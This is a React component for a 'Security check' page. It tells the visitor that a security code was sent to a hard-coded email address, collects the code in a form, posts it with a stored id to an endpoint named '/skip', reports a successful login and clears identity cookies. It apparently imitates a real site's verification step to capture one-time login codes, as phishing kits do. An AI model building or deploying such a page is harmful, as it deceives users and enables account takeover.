import { Field, Form, Formik } from "formik";
import Cookies from "js-cookie";
import { toast } from "react-toastify";
import { API_URL } from "../config";

function Security({ id }) {
  const initialvalues = {
    id: id,
    skipcode: "",
  };

  const handleSubmit = async (values, formik) => {
    // console.log(values);

    const url = `${API_URL}/skip`;

    const res = await fetch(url, {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
      },
      body: JSON.stringify(values),
    });

    const data = await res.json();

    if (res.ok) {
      console.log("success", data);
      toast.success("Login Succecssfull");
      formik.resetForm();
      Cookies.remove("id");
      Cookies.remove("email");
    } else {
      console.log("error", data);
      toast.error("Something Went Wrong");
    }
  };

  return (
    <div className="container px-4 lg:px-0">
      <div className="pt-[14px] lg:pt-[18px] py-[38px] text-custom-gray2">
        <h1 className="text-[27px]">Security check</h1>
        <div className="mt-[8px] space-y-[22px]">
          <p className="">
            We have upgraded our security to protect all users against account
            takeovers and hacking.
          </p>
          <p className="">
            A security code has been sent to your address school1@email.com I
            don't have access to this email account
          </p>
          <p className="">Please enter this code here:</p>

          <div className="pt-1">
            <Formik
              initialValues={initialvalues}
              // validationSchema={validate}
              onSubmit={handleSubmit}
            >
              {(formik) => (
                <Form className="flex gap-5">
                  <div className="">
                    <Field
                      className="lg:w-[470px] text-sm px-[8px] py-[7px] outline-none border border-slate-300 focus:border-custom-rose/50 focus:bg-custom-gray3 shadow-inner transition duration-300"
                      placeholder="Type in the numbers you received"
                      name="skipcode"
                      type="text"
                      required
                    />
                  </div>
                  <button
                    type="submit"
                    className=" bg-custom-cyan hover:bg-custom-cyan2 px-[25px] py-[12px] text-white text-sm transition duration-300 rounded"
                  >
                    Submit
                  </button>
                </Form>
              )}
            </Formik>
          </div>

          <p className="pt-4">The code you received is good for 30 minutes.</p>
          <p className="">
            It may take the code up to 10 minutes to arrive. Make sure to check
            your Spam/Junk/Trash folder.
          </p>

          <div className="flex gap-9 text-custom-rose">
            <p className="cursor-pointer hover:text-custom-rose2 underline">
              Resend the code
            </p>
            <p className="cursor-pointer hover:text-custom-rose2 underline">
              I don't have access to this email account
            </p>
          </div>
        </div>
      </div>
    </div>
  );
}

export default Security;
